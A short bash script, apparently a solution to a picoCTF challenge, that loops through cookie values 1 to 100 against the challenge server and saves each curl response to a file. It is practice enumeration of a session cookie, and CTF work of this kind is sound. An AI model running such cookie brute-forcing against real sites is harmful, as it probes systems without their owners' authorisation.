# use curl to iterate through 100 values of the cookie name=value from 0 to 100, save response in a file

for i in $(seq 1 100);
do
    curl -o "./results/response$i.txt" -b "name=$i" http://mercury.picoctf.net:54219/check --append -L
done